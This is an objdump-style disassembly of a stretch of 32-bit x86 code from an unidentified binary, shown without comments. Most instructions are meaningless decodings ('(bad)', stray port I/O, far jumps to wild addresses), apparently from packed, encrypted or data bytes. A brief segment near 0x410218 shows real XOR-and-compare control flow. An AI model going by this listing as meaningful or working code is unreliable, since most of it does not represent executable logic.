  4100e7:	ret    0xffd2
  4100ea:	out    dx,al
  4100eb:	rol    esp,1
  4100ed:	frstpm(287 only) 
  4100ef:	(bad)  
  4100f0:	cld    
  4100f1:	cli    
  4100f2:	jmp    0x4100d7
  4100f4:	(bad)  
  4100f6:	fmulp  st(3),st
  4100f8:	retf   
  4100f9:	in     al,dx
  4100fa:	mov    dl,0xe0
  4100fc:	retf   0xebd7
  4100ff:	mov    cl,0xb5
  410101:	out    dx,al
  410102:	int3   
  410103:	in     al,dx
  410104:	cmc    
  410105:	mov    ecx,0xc0c3b8cc
  41010a:	add    ah,ch
  41010c:	(bad)  
  41010d:	shl    dh,1
  41010f:	fild   DWORD PTR [ecx]
  410111:	add    ebp,ebp
  410113:	out    0xe2,al
  410115:	or     edi,edi
  410117:	mov    ebp,0xc1f1f0ca
  41011c:	in     al,0xc2
  41011e:	int3   
  41011f:	mov    bh,0xe4
  410121:	jmp    0x4100da
  410123:	mov    esi,0xe9cdf1e8
  410128:	add    edi,eax
  41012a:	hlt    
  41012b:	mov    DWORD PTR [ecx],0xd4c9c2db
  410131:	(bad)  
  410132:	jmp    0x41011a
  410134:	dec    bl
  410136:	leave  
  410137:	jecxz  0x4100fc
  410139:	loopne 0x410122
  41013b:	in     al,0xfb
  41013d:	call   0xf21ce9f7
  410142:	fdivp  st(1),st
  410144:	jmp    0xce13fe24
  410149:	pop    es
  41014a:	add    eax,0xd7f9d8c2
  41014f:	add    ebx,eax
  410151:	shr    ebp,0xfd
  410154:	into   
  410155:	add    eax,DWORD PTR [esi]
  410157:	out    0xc7,eax
  410159:	out    0xb1,eax
  41015b:	retf   0xb3bc
  41015e:	call   0xe727b92a
  410163:	fbstp  TBYTE PTR [edi+ebx*8-0x2cfefd22]
  41016a:	mov    ebp,0xe007f007
  41016f:	rcr    bh,1
  410171:	out    0xcb,al
  410173:	cld    
  410174:	clc    
  410175:	or     al,0xc9
  410177:	lods   eax,DWORD PTR ds:[esi]
  410178:	mov    ebp,0xd3e1b7ae
  41017d:	rcr    ebx,0xda
  410180:	enter  0xbee5,0xf7
  410184:	fucomi st,st(5)
  410186:	repnz fdivr st,st(5)
  410189:	(bad)  
  41018a:	clc    
  41018b:	add    al,0xd8
  41018d:	in     al,0xe1
  41018f:	stc    
  410190:	fucom  st(3)
  410192:	out    0xec,al
  410194:	repz (bad) 
  410197:	iret   
  410198:	icebp  
  410199:	lods   eax,DWORD PTR ds:[esi]
  41019a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41019b:	in     al,dx
  41019c:	in     eax,0xca
  41019e:	(bad)  
  41019f:	sti    
  4101a0:	mov    ebx,0xddbbb6cb
  4101a5:	shl    eax,1
  4101a7:	(bad)  
  4101a8:	fild   WORD PTR [edi]
  4101aa:	int3   
  4101ab:	ror    DWORD PTR [ebx],0xdd
  4101ae:	or     ah,bl
  4101b0:	jmp    0xcd4c02be
  4101b5:	out    dx,eax
  4101b6:	fadd   st,st(3)
  4101b8:	(bad)
  4101bb:	mov    dh,0xf6
  4101bd:	retf   
  4101be:	sti    
  4101bf:	(bad)  
  4101c0:	neg    cl
  4101c2:	shl    DWORD PTR [ebp-0x8020801],1
  4101c8:	sar    DWORD PTR [eax-0x421e06ff],cl
  4101ce:	add    eax,esi
  4101d0:	lock jmp 0xd4507cb
  4101d6:	add    al,0xb3
  4101d8:	mov    esp,0xe6c7c1de
  4101dd:	loop   0x4101d8
  4101df:	mov    edx,0xceb6d3d3
  4101e4:	retf   
  4101e5:	aad    0xd4
  4101e7:	mov    edx,0xf3fbf901
  4101ec:	(bad)  
  4101ed:	jmp    0x4101ee
  4101ef:	(bad)  
  4101f0:	hlt    
  4101f1:	aad    0xfb
  4101f3:	jmp    0xc9cb:0xe9f9f2cb
  4101fa:	scas   al,BYTE PTR es:[edi]
  4101fb:	mov    al,0xb2
  4101fd:	mov    cl,0xc7
  4101ff:	out    0xca,eax
  410201:	iret   
  410202:	mov    ch,0xb5
  410204:	(bad)  
  410205:	in     al,dx
  410206:	ret    0xc1cd
  410209:	inc    bh
  41020b:	add    esi,edx
  41020d:	jmp    0xf8ce:0xeec1c6c3
  410214:	inc    BYTE PTR [esi]
  410216:	add    ch,cl
  410218:	add    edx,DWORD PTR [ecx+eax*4]
  41021b:	mov    DWORD PTR [ebp-0x10],edx
  41021e:	mov    eax,DWORD PTR [ebp-0x3c]
  410221:	xor    eax,0x75108b5
  410226:	add    eax,0x3272fb
  41022b:	cmp    DWORD PTR [ebp-0x10],eax
  41022e:	je     0x41023e
  410234:	jmp    0x412644
  410239:	jmp    0x412644
  41023e:	mov    eax,DWORD PTR [ebp-0x2c]
  410241:	mov    ecx,DWORD PTR [ebp-0x3c]
  410244:	xor    ecx,0x75108b5
  41024a:	add    ecx,0x3272fb
  410250:	cmp    eax,ecx
  410252:	je     0x4125f9
  410258:	mov    eax,DWORD PTR [ebp-0x44]
  41025b:	mov    ecx,DWORD PTR [ebp-0x24]
  41025e:	movzx  eax,WORD PTR [ecx+eax*2]
  410262:	mov    ecx,DWORD PTR [ebp-0x20]
  410265:	jmp    0x4125ee
  41026a:	push   edi
  41026b:	scas   eax,DWORD PTR es:[edi]
  41026c:	jp     0x410212
  41026e:	bound  esi,QWORD PTR [ebp+esi*2-0x1b035694]
  410275:	xor    BYTE PTR [edx-0x25b6b981],bl
  41027b:	dec    eax
  41027c:	jnp    0x4102f9
  41027e:	out    0x98,eax
  410280:	jnp    0x4102fd
  410282:	into   
  410283:	fsubrp st(0),st
  410285:	in     eax,dx
  410286:	out    dx,eax
  410287:	mov    al,0xd6
  410289:	into   
  41028a:	hlt    
  41028b:	repnz out dx,eax
  41028d:	fnop   
  41028f:	cli    
  410290:	mov    eax,0xc1d0f8e2
  410295:	(bad)  
  410296:	fdivr  DWORD PTR [eax+eax*8-0x36343ff6]
  41029d:	aad    0xd
  41029f:	(bad)  
  4102a0:	cld    
  4102a1:	shr    ah,cl
  4102a3:	mov    bl,0xc4
  4102a5:	mov    ch,0xef
  4102a7:	cli    
  4102a8:	enter  0xb0b2,0xf6
  4102ac:	cmc    
  4102ad:	jmp    0xf215cb84
  4102b2:	std    
  4102b3:	(bad)  
  4102b5:	mov    esp,0x3e106ff
  4102ba:	lsl    edx,sp
  4102bd:	fsub   st,st(6)
  4102bf:	enter  0xe3c0,0xcd
  4102c3:	call   0xc117f6ae
  4102c8:	int    0xf7
  4102ca:	call   0xd9f9e2c0
  4102cf:	in     al,dx
  4102d0:	fistp  QWORD PTR [esi-0x382cf921]
  4102d6:	aad    0x0
  4102d8:	call   esp
  4102da:	enter  0xf9cb,0xff
  4102de:	loope  0x4102bf
  4102e0:	call   0xb1edc1a4
  4102e5:	(bad)  
  4102e6:	mov    ah,0xdb
  4102e8:	iret   
  4102e9:	stc    
  4102ea:	hlt    
  4102eb:	in     al,0xbe
  4102ed:	fucomi st,st(7)
  4102ef:	(bad)  
  4102f0:	mov    ecx,0xf4f4dbba
  4102f5:	aam    0xc7
  4102f7:	(bad)  
  4102f8:	clc    
  4102f9:	lock rcr dh,0xe4
  4102fd:	aad    0xee
  4102ff:	fdivp  st(7),st
  410301:	in     al,dx
  410302:	(bad)  
  410303:	mov    esp,0xd5f5f6de
  410308:	mov    dl,0xb9
  41030a:	(bad)  
  41030b:	(bad)  
  41030c:	mov    al,0xea
  41030e:	aad    0xf4
  410310:	fcmovu st,st(4)
  410312:	jecxz  0x4102f5
  410314:	(bad)  
  410315:	sar    cl,1
  410317:	repnz mov eax,0xd4ffe000
  41031d:	(bad)  
  41031e:	(bad)  
  410320:	shl    BYTE PTR [edi-0x1e320d40],cl
  410326:	(bad)  
  410327:	hlt    
  410328:	div    DWORD PTR [esi-0x2620150c]
  41032e:	shr    bh,1
  410330:	shr    esi,1
  410332:	mov    esp,0xecbee7db
  410337:	jmp    eax
  410339:	sar    dl,1
  41033b:	out    dx,eax
  41033c:	or     ebx,eax
  41033e:	sti    
  41033f:	retf   0xc8f1
  410342:	les    ebp,FWORD PTR [ecx-0xd2d3154]
  410348:	rol    esi,1
  41034a:	aad    0xdb
  41034c:	dec    ebx
  41034e:	mov    esp,0xb9badbfd
  410353:	mov    edi,0xe5f7c7fe
  410358:	repnz or esi,eax
  41035b:	out    dx,al
  41035c:	in     al,0x8
  41035e:	fadd   DWORD PTR [esi]
  410360:	jecxz  0x41030f
  410362:	in     al,dx
  410363:	mov    esi,0xc5e8c5cc
  410368:	mov    ah,0xcc
  41036a:	shl    esp,cl
  41036c:	vpmulhuw ymm1,ymm3,ymm4
  410370:	mov    esi,0xccf4d0db
  410375:	(bad)  
  410376:	rcl    eax,1
  410378:	fdiv   st(3),st
  41037a:	enter  0xfda,0xee
  41037e:	in     al,dx
  41037f:	repnz frstor [edi-0x3c1f2c42]
  410386:	repz out 0xb5,al
  410389:	mov    ecx,0xf7cafbd0
  41038e:	cld    
  41038f:	iret   
  410390:	into   
  410391:	cli    
  410392:	xlat   BYTE PTR ds:[ebx]
  410393:	mov    ebp,0xe4f1bbfc
  410398:	(bad)  [ecx]
  41039a:	sti    
  41039b:	or     edi,ebx
  41039d:	in     eax,dx
  41039e:	retf   0xea0a
  4103a1:	scas   eax,DWORD PTR es:[edi]
  4103a2:	test   eax,0xe5c1f2cd
  4103a7:	(bad)  
  4103a8:	aam    0xeb
  4103aa:	out    0xb1,eax
  4103ac:	out    0xf7,al
  4103ae:	add    edi,edx
  4103b0:	(bad)  
  4103b2:	(bad)  
  4103b3:	ret    
  4103b4:	mov    ebp,0xf90bd9fc
  4103b9:	mov    BYTE PTR [eax],0xdc
  4103bc:	jmp    0x4103ab
  4103be:	(bad)  
  4103c0:	into   
  4103c1:	scas   al,BYTE PTR es:[edi]
  4103c2:	iret   
  4103c3:	retf   
  4103c4:	mul    ecx
  4103c6:	loopne 0x4103b1
  4103c8:	(bad)  
  4103c9:	mov    ebx,0xb6e6b0b5
  4103ce:	rcr    bh,1
  4103d0:	fdivr  QWORD PTR [ecx-0x25241304]
  4103d6:	add    ecx,ebx
  4103d8:	(bad)  
  4103da:	add    eax,DWORD PTR [ecx]
  4103dc:	cmc    
  4103dd:	push   cs
  4103de:	in     al,0xe7
  4103e0:	in     eax,dx
  4103e1:	(bad)  
  4103e2:	scas   eax,DWORD PTR es:[edi]
  4103e3:	jmp    0xe6f9:0xf2c3e5f6
  4103ea:	fcmovu st,st(7)
  4103ec:	in     al,dx
  4103ed:	mov    bh,0xce
  4103ef:	add    ebx,edx
  4103f1:	rol    DWORD PTR [edi],1
  4103f3:	add    edx,eax
  4103f5:	mov    ebx,0xfe04e2bd
  4103fa:	enter  0xe2e2,0xd8
  4103fe:	aam    0xfd
  410400:	faddp  st(1),st
  410402:	int3   
  410403:	jmp    0xb7efdaf4
  410408:	test   dh,0xd0
  41040b:	in     eax,0xee
  41040d:	int3   
  41040e:	in     al,0xba
  410410:	mov    edi,0x3e1cf03
  410415:	std    
  410416:	jmp    0x4103f8
  410418:	rol    BYTE PTR [edx],0xe0
  41041b:	loop   0x4103fe
  41041d:	in     al,0x8
  41041f:	int    0xfc
  410421:	mov    dl,0xed
  410423:	test   ebp,0xc9f4e4ea
  410429:	int    0xd3
  41042b:	(bad)  
  41042c:	aad    0xf4
  41042e:	xlat   BYTE PTR ds:[ebx]
  41042f:	call   0xf540f829
  410434:	add    edx,ebx
  410436:	or     eax,edi
  410438:	repnz fsub st,st(7)
  41043b:	or     bl,bl
  41043d:	pop    es
  41043e:	out    dx,al
  41043f:	add    eax,0xf2ecd9eb
  410444:	loop   0x410415
  410446:	retf   
  410447:	(bad)  
  410448:	lock retf 
  41044a:	loopne 0x410442
  41044c:	repnz enter 0xdfd4,0xd3
  410451:	out    dx,eax
  410452:	into   
  410453:	add    eax,ebx
  410455:	in     al,dx
  410456:	(bad)  
  410457:	fsubr  st(7),st
  410459:	aad    0xc5
  41045b:	or     ch,dl
  41045d:	ret    
  41045e:	jmp    0xf00ed15f
  410463:	loop   0x410450
  410465:	in     eax,0xcc
  410467:	in     al,0xce
  410469:	hlt    
  41046a:	shl    BYTE PTR [edi-0x41293a49],cl
  410470:	mov    al,0xe8
  410472:	loop   0x410432
  410474:	fcmovnu st,st(3)
  410476:	neg    bl
  410478:	cmc    
  410479:	push   es
  41047a:	in     eax,0xda
  41047c:	sti    
  41047d:	push   es
  41047e:	(bad)  
  41047f:	(bad)  
  410481:	int3   
  410482:	scas   eax,DWORD PTR es:[edi]
  410483:	shr    eax,1
  410485:	ret    0xcfac
  410488:	mov    bh,0xd8
  41048a:	retf   
  41048b:	xlat   BYTE PTR ds:[ebx]
  41048c:	cli    
  41048d:	out    dx,al
  41048e:	dec    ebx
  410490:	xlat   BYTE PTR ds:[ebx]
  410491:	iret   
  410492:	ror    bh,cl
  410494:	rcl    al,1
  410496:	(bad)
  410499:	ret    0xfed8
  41049c:	loop   0x41049d
  41049e:	retf   0xf9e1
  4104a1:	loop   0x410494
  4104a3:	enter  0xe4cb,0xc0
  4104a7:	hlt    
  4104a8:	jmp    0x13ef5c
  4104ad:	mov    eax,0xb8e8d0c4
  4104b2:	fst    st(2)
  4104b4:	mov    DWORD PTR [edi],0x2dee4d5
  4104ba:	(bad)  
  4104bc:	cld    
  4104bd:	(bad)  
  4104be:	cli    
  4104bf:	or     eax,0xc2ced3d8
  4104c4:	loope  0x4104b7
  4104c6:	jmp    0xf8d4:0xd1d0d5f4
  4104cd:	mov    ecx,0xccf9f3b4
  4104d2:	in     eax,dx
  4104d3:	loopne 0x4104c3
  4104d5:	clc    
  4104d6:	out    0xde,al
  4104d8:	icebp  
  4104d9:	leave  
  4104da:	jecxz  0x4104b2
  4104dc:	add    eax,0xe3fdfc04
  4104e1:	shl    BYTE PTR [ebx-0x52232d3c],0xca
  4104e8:	jmp    0xf7ca:0xc5cef7e0
  4104ef:	mov    ebx,0xd7cdf3d3
  4104f4:	(bad)  
  4104f6:	rcl    ebp,0xff
  4104f9:	(bad)  
  4104fa:	call   0x7fd07
  4104ff:	leave  
  410500:	or     bh,ah
  410502:	loopne 0x4104cd
  410504:	shl    BYTE PTR [edx-0x271e0e16],cl
  41050a:	(bad)
  41050d:	rol    DWORD PTR [ebx],cl
  41050f:	jmp    0xfad0:0xd1f5d0e8
  410516:	idiv   edx
  410518:	add    al,0x7
  41051a:	or     ecx,DWORD PTR [ebx]
  41051c:	fimul  DWORD PTR [edi]
  41051e:	sti    
  41051f:	jmp    0xf3d0:0xc2d1d103
  410526:	icebp  
  410527:	in     eax,0xc9
  410529:	(bad)  
  41052a:	push   DWORD PTR [ecx-0x12323454]
  410530:	(bad)  
  410532:	hlt    
  410533:	mov    ch,0x2
  410535:	(bad)  
  410536:	jmp    0x410533
  410538:	fnsetpm(287 only) 
  41053a:	mov    esi,0xebfbdcd8
  41053f:	add    edx,esp
  410541:	ret    
  410542:	in     al,dx
  410543:	int3   
  410544:	in     eax,dx
  410545:	jmp    0xf837bcfc
  41054a:	les    edi,FWORD PTR [ecx-0xc471309]
  410550:	icebp  
  410551:	loop   0x410549
  410553:	xlat   BYTE PTR ds:[ebx]
  410554:	mov    edi,0xf7fff4d0
  410559:	retf   0xfec5
  41055c:	loopne 0x41056d
  41055e:	jmp    0xc12ccd68
  410563:	in     al,0xb0
  410565:	mov    dh,0xaa
  410567:	aam    0xcd
  410569:	iret   
  41056a:	lock mov al,0xd3
  41056d:	(bad)
  410570:	(bad)  
  410571:	cmc    
  410572:	rol    bl,1
  410574:	repz fdivp st(1),st
  410577:	rcr    dh,cl
  410579:	test   DWORD PTR [edi],0xeee801f8
  41057f:	in     al,dx
  410580:	out    dx,al
  410581:	int3   
  410582:	mov    esp,0xcbabe1b0
  410587:	hlt    
  410588:	aad    0xf8
  41058a:	in     al,dx
  41058b:	mov    ah,0xe5
  41058d:	mov    ch,0xf1
  41058f:	(bad)  
  410590:	mov    ecx,0xd7fdbcf5
  410595:	cld    
  410596:	loope  0x410578
  410598:	jmp    0x41055a
  41059a:	loopne 0x41057c
  41059c:	enter  0xc5fb,0xa
  4105a0:	in     al,dx
  4105a1:	mov    ebp,0xedcaeab3
  4105a6:	mov    bl,0xfb
  4105a8:	test   al,0xeb
  4105aa:	aam    0xeb
  4105ac:	xlat   BYTE PTR ds:[ebx]
  4105ad:	in     eax,0xb6
  4105af:	mov    eax,0xdee003f1
  4105b4:	mov    edi,0xe5cbd7d9
  4105b9:	not    ah
  4105bb:	(bad)  
  4105bd:	call   0xf252e0a2
  4105c2:	(bad)  
  4105c3:	out    0xea,eax
  4105c5:	cmc    
  4105c6:	out    dx,eax
  4105c7:	repz mov bh,0xc6
  4105ca:	in     al,0xff
  4105cc:	neg    esp
  4105ce:	int    0xd1
  4105d0:	jecxz  0x4105cb
  4105d2:	lock lock into 
  4105d5:	mov    edi,0xfae0dc04
  4105da:	in     al,0xfa
  4105dc:	retf   0xfbf4
  4105df:	or     al,0x4
  4105e1:	mov    ecx,0xc2d5b2e4
  4105e6:	rol    ecx,cl
  4105e8:	repz (bad) 
  4105ea:	mov    ah,0xd2
  4105ec:	ror    ebx,cl
  4105ee:	mov    eax,0x2e1cfb9
  4105f3:	out    0xde,al
  4105f5:	mov    edi,0x507f1fc
  4105fa:	in     eax,0xf
  4105fc:	add    eax,0xcff2c4ee
  410601:	out    0xcb,eax
  410603:	repz fadd st(5),st
  410606:	jmp    0xf4b6:0xf3eec4e2
  41060d:	(bad)  
  41060e:	lock jmp 0xda05:0xfde8dafc
  410616:	mul    esp
  410618:	fdivp  st(4),st
  41061a:	shl    dh,1
  41061c:	loopne 0x410621
  41061e:	out    dx,al
  41061f:	call   DWORD PTR [ecx]
  410621:	mov    eax,0xf3b6afbd
  410626:	vpsllw ymm0,ymm3,xmm7
  41062a:	jmp    0x4105d9
  41062c:	(bad)
  41062f:	mov    ah,0xda
  410631:	loope  0x41062a
  410633:	(bad)  
  410634:	jecxz  0x4105f9
  410636:	hlt    
  410637:	(bad)  
  410639:	(bad)  
  41063a:	fsubrp st(7),st
  41063c:	in     eax,0xe5
  41063e:	or     bl,al
  410640:	(bad)  
  410641:	repz out 0xc0,al
  410644:	(bad)  
  410645:	repz fmul st(0),st
  410648:	idiv   dl
  41064a:	int    0xba
  41064c:	in     al,dx
  41064d:	int3   
  41064e:	test   BYTE PTR [ebx],0x2
  410651:	out    dx,al
  410652:	rcr    edx,cl
  410654:	fscale 
  410656:	add    dl,dh
  410658:	in     eax,0xdb
  41065a:	cli    
  41065b:	(bad)  
  41065c:	loope  0x410667
  41065e:	int3   
  41065f:	pop    es
  410660:	jmp    0xc4b2:0xf2bcdecf
  410667:	lods   eax,DWORD PTR ds:[esi]
  410668:	mov    bl,0xc7
  41066a:	mov    al,0xba
  41066c:	in     al,0xf1
  41066e:	cmc    
  41066f:	div    ebp
  410671:	repz rcl esp,cl
  410674:	mov    esp,0xe6dabdbc
  410679:	sar    bh,1
  41067b:	retf   0xede6
  41067e:	aam    0xcb
  410680:	bswap  esi
  410682:	shr    BYTE PTR [eax-0xf361610],0xd6
  410689:	int3   
  41068a:	mov    ebx,0xeec5ddb7
  41068f:	rcr    esp,1
  410691:	rcl    dl,1
  410693:	sar    DWORD PTR [esi-0x62e1d26],cl
  410699:	leave  
  41069a:	retf   0x7c6
  41069d:	retf   0xfeec
  4106a0:	std    
  4106a1:	repz loop 0x410663
  4106a4:	imul   esp
  4106a6:	fmul   st(3),st
  4106a8:	in     al,dx
  4106a9:	mov    edx,0xffe5ceec
  4106ae:	mov    ah,0xf5
  4106b0:	aad    0xbe
  4106b2:	in     al,dx
  4106b3:	clc    
  4106b4:	rol    BYTE PTR [edi],0xfd
  4106b7:	repz add eax,0xe4f7e503
  4106bd:	stc    
  4106be:	or     eax,0xeedd0bdb
  4106c3:	mov    dl,0xf5
  4106c5:	in     eax,dx
  4106c6:	fsub   st(6),st
  4106c8:	in     al,dx
  4106c9:	mov    ch,0xae
  4106cb:	out    dx,al
  4106cc:	xlat   BYTE PTR ds:[ebx]
  4106cd:	mov    bl,0xd5
  4106cf:	mov    ebp,0xd9f200f6
  4106d4:	clc    
  4106d5:	ret    
  4106d6:	stc    
  4106d7:	(bad)  
  4106d9:	rol    eax,0xe7
  4106dc:	inc    BYTE PTR [edx]
  4106de:	(bad)  
  4106df:	out    dx,al
  4106e0:	repnz stos BYTE PTR es:[edi],al
  4106e2:	mov    bl,0xb2
  4106e4:	shl    bl,1
  4106e6:	test   edi,0xf7bae6e2
  4106ec:	repz mov eax,0xd7eaeebb
  4106f2:	int3   
  4106f3:	jecxz  0x4106ef
  4106f5:	icebp  
  4106f6:	loop   0x4106e8
  4106f8:	clc    
  4106f9:	jecxz  0x4106ff
  4106fb:	sar    ebx,0xc3
  4106fe:	stc    
  4106ff:	int3   
  410700:	shl    dl,cl
  410702:	iret   
  410703:	test   al,0xc1
  410705:	icebp  
  410706:	(bad)  
  410707:	mov    cl,0xc2
  410709:	repnz repnz fmulp st(3),st
  41070d:	enter  0xd7dc,0xda
  410711:	aam    0x3
  410713:	std    
  410714:	in     eax,0xc2
  410716:	fdivr  st,st(2)
  410718:	fcmovnu st,st(2)
  41071a:	xadd   esi,eax
  41071d:	std    
  41071e:	leave  
  41071f:	in     al,0xf3
  410721:	out    0xdf,eax
  410723:	repnz icebp 
  410725:	ror    ch,cl
  410727:	rol    ebp,cl
  410729:	rcr    eax,0xf2
  41072c:	mov    ah,0xc8
  41072e:	(bad)  
  41072f:	stc    
  410730:	mov    al,0x3
  410732:	int3   
  410733:	jecxz  0x410734
  410735:	loope  0x410735
  410737:	or     bl,dh
  410739:	cmc    
  41073a:	jmp    0xf9070216
  41073f:	lds    eax,FWORD PTR [edi+eax*8]
  410742:	in     al,dx
  410743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410744:	mov    bh,0xc4
  410746:	mov    bh,0xb5
  410748:	fsqrt  
  41074a:	mov    eax,0xffb9d5c9
  41074f:	bnd call 0xd338c218
  410755:	in     eax,dx
  410756:	rol    DWORD PTR [edx],0xc2
  410759:	clc    
  41075a:	(bad)
  41075d:	sti    
  41075e:	in     al,0xe7
  410760:	cld    
  410761:	mov    ch,0xd0
  410764:	ror    eax,cl
  410766:	lods   al,BYTE PTR ds:[esi]
  410767:	mov    dh,0xe5
  410769:	in     al,dx
  41076a:	mov    dh,0xd5
  41076c:	(bad)
  41076f:	leave  
  410770:	leave  
  410771:	into   
  410772:	rol    DWORD PTR [ecx],cl
  410774:	mov    eax,0x3e0bcc3
  410779:	div    eax
  41077b:	out    0xd6,al
  41077d:	call   0xbc500e87
  410782:	enter  0xe1bf,0xcc
  410786:	int3   
  410787:	imul   ebx
  410789:	in     eax,0xfa
  41078b:	iret   
  41078c:	lock mov bh,0xcb
  41078f:	cmc    
  410790:	(bad)  
  410791:	cmc    
  410792:	int    0xda
  410794:	repnz stc 
  410796:	cli    
  410797:	out    0xbc,eax
  410799:	fdivp  st(6),st
  41079b:	add    ah,ah
  41079d:	hlt    
  41079e:	loop   0x4107a1
  4107a0:	rol    bl,0xc2
  4107a3:	rcl    bh,1
  4107a5:	mov    dh,0xef
  4107a7:	sar    cl,0xcc
  4107aa:	mov    ah,0xcf
  4107ac:	(bad)  
  4107ad:	repnz (bad) 
  4107af:	mov    ebp,0xfcfaced7
  4107b4:	mov    ah,0xd3
  4107b6:	cli    
  4107b7:	sar    esi,cl
  4107b9:	jmp    0xf9fa:0xc4e6f8da
  4107c0:	or     ch,al
  4107c2:	(bad)  
  4107c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107c4:	in     al,0xb5
  4107c6:	loopne 0x41079b
  4107c8:	not    edi
  4107ca:	out    dx,al
  4107cb:	aad    0xfa
  4107cd:	in     al,dx
  4107ce:	jmp    0x4107bd
  4107d0:	icebp  
  4107d1:	mov    esp,0xe7e5d1d2
  4107d6:	not    cl
  4107d8:	loop   0x4107b9
  4107da:	add    esp,ebp
  4107dc:	jmp    0xc0d0:0xdc13ebee
  4107e3:	fucom  st(2)
  4107e5:	loop   0x41079c
  4107e7:	jmp    0x4107af
  4107e9:	in     al,0xb4
  4107eb:	xlat   BYTE PTR ds:[ebx]
  4107ec:	stc    
  4107ed:	jmp    0xfe0bb9e8
  4107f2:	hlt    
  4107f3:	rcl    ah,1
  4107f5:	sar    edi,1
  4107f7:	jmp    0xfce0:0xc0fbe8fd
  4107fe:	jmp    0xe2b3:0xe4de02eb
  410805:	into   
  410806:	shl    al,0xf3
  410809:	int3   
  41080a:	cli    
  41080b:	(bad)  
  41080c:	sti    
  41080d:	int    0xf1
  41080f:	aad    0xb0
  410811:	in     al,dx
  410812:	aam    0xf8
  410814:	aam    0xed
  410816:	rcr    bl,1
  410818:	in     al,0x5
  41081a:	std    
  41081b:	sti    
  41081c:	push   es
  41081d:	std    
  41081e:	out    dx,al
  41081f:	in     al,dx
  410820:	iret   
  410821:	loope  0x4107ea
  410823:	mov    esi,0xb0d5cbd7
  410828:	leave  
  410829:	out    dx,eax
  41082a:	not    edx
  41082c:	repz aam 0xd7
  41082f:	loop   0x410819
  410831:	icebp  
  410832:	add    DWORD PTR [ecx],eax
  410834:	int    0x1
  410836:	stc    
  410837:	rcr    ch,0x6
  41083a:	add    al,0xbd
  41083c:	inc    BYTE PTR [edx]
  41083e:	sti    
  41083f:	inc    BYTE PTR [edi]
  410841:	mov    dl,0xcc
  410843:	mov    ebp,0xedacc1e8
  410848:	in     eax,0xe1
  41084a:	mov    dh,0xcc
  41084c:	call   0xb914d119
  410851:	stc    
  410852:	not    esi
  410854:	repz mov esi,0xcab8fcd7
  41085a:	loopne 0x410853
  41085c:	add    cl,cl
  41085e:	ret    0xc0cb
  410861:	shl    BYTE PTR [eax-0x3632111d],0xe8
  410868:	mov    ebx,0xfee5ffbb
  41086d:	int    0xe3
  41086f:	fcmove st,st(1)
  410871:	mov    esi,0xbcc2f802
  410876:	sti    
  410877:	(bad)  
  410878:	(bad)  
  410879:	mov    edi,0xece1c4e4
  41087e:	add    al,0xcc
  410880:	jmp    ebp
  410882:	out    dx,eax
  410883:	loopne 0x410857
  410885:	rcl    esi,0xd6
  410888:	stc    
  410889:	xlat   BYTE PTR ds:[ebx]
  41088a:	mov    ebx,0xdfbbddcc
  41088f:	repnz enter 0xfdd0,0xd5
  410894:	repnz out 0xf2,al
  410897:	loopne 0x41087b
  410899:	in     eax,0xca
  41089b:	sti    
  41089c:	(bad)  
  41089f:	enter  0xc7e4,0xa8
  4108a3:	out    dx,al
  4108a4:	iret   
  4108a5:	leave  
  4108a6:	int3   
  4108a7:	sti    
  4108a8:	mov    bh,0xf3
  4108aa:	mov    ah,0xcd
  4108ac:	hlt    
  4108ad:	retf   0xc3d9
  4108b0:	icebp  
  4108b1:	(bad)  
  4108b3:	rol    DWORD PTR [edx],1
  4108b5:	rol    al,cl
  4108b7:	add    bh,cl
  4108b9:	leave  
  4108ba:	cld    
  4108bb:	pop    es
  4108bc:	loop   0x4108c6
  4108be:	cli    
  4108bf:	fmul   DWORD PTR [esi]
  4108c1:	(bad)  
  4108c3:	mov    ebp,0xb1adbcf3
  4108c8:	(bad)  
  4108ca:	stc    
  4108cb:	div    ecx
  4108cd:	aad    0xf8
  4108cf:	lock retf 0xe1c8
  4108d3:	(bad)  
  4108d4:	mov    eax,0xe7c7c2c1
  4108d9:	push   es
  4108da:	mul    al
  4108dc:	add    ch,ah
  4108de:	or     BYTE PTR [edx],cl
  4108e0:	clc    
  4108e1:	loop   0x4108b6
  4108e3:	fsub   st(1),st
  4108e5:	in     al,dx
  4108e6:	mov    bh,0xc1
  4108e8:	retf   0xe0ed
  4108eb:	test   ecx,0xcff0f7bd
  4108f1:	(bad)  
  4108f3:	int    0xc2
  4108f5:	fsubr  st(7),st
  4108f7:	fadd   st,st(3)
  4108f9:	fdiv   st(0),st
  4108fb:	(bad)  
  4108fc:	(bad)  
  4108fe:	add    ecx,DWORD PTR [eax+eiz*8]
  410901:	rcl    ebx,1
  410903:	in     al,0xc3
  410905:	jmp    0x4108bb
  410907:	cli    
  410908:	retf   
  410909:	icebp  
  41090a:	xlat   BYTE PTR ds:[ebx]
  41090b:	jmp    0xf7f6d403
  410910:	neg    edi
  410912:	enter  0xd6fb,0xf7
  410916:	add    dl,al
  410918:	xlat   BYTE PTR ds:[ebx]
  410919:	fyl2xp1 
  41091b:	loope  0x41091f
  41091d:	in     eax,0xe3
  41091f:	push   cs
  410920:	iret   
  410921:	test   al,0xe9
  410923:	out    0xd0,al
  410925:	out    dx,eax
  410926:	mov    ch,0xc7
  410928:	icebp  
  410929:	jmp    0x4108e0
  41092b:	icebp  
  41092c:	(bad)  
  41092d:	in     eax,dx
  41092e:	fnstsw WORD PTR [ebx-0x83e1fff]
  410934:	in     eax,dx
  410935:	cli    
  410936:	test   DWORD PTR [ebx],0xddde05e7
  41093c:	loope  0x410917
  41093e:	cld    
  41093f:	shr    ebp,0xce
  410942:	fmulp  st(1),st
  410944:	repz scas al,BYTE PTR es:[edi]
  410946:	mov    esp,0xc5eac2d1
  41094b:	mov    al,0xb7
  41094d:	in     al,dx
  41094e:	(bad)  
  410950:	shl    edx,cl
  410952:	cmc    
  410953:	stc    
  410954:	add    eax,0xe5dcf4dd
  410959:	add    dh,ah
  41095b:	in     al,0xde
  41095d:	pop    es
  41095e:	ret    0xcad3
  410961:	mov    ecx,0xefe1eead
  410966:	in     eax,0xd6
  410968:	ror    cl,0xb8
  41096b:	out    dx,al
  41096c:	jmp    0xfe2cbe41
  410971:	(bad)  
  410973:	mov    ebp,0xae5c7c7
  410978:	shl    ecx,0xf
  41097b:	hlt    
  41097c:	fild   WORD PTR [esi]
  41097e:	out    dx,eax
  41097f:	jecxz  0x41096b
  410981:	bnd ret 0xf2f2
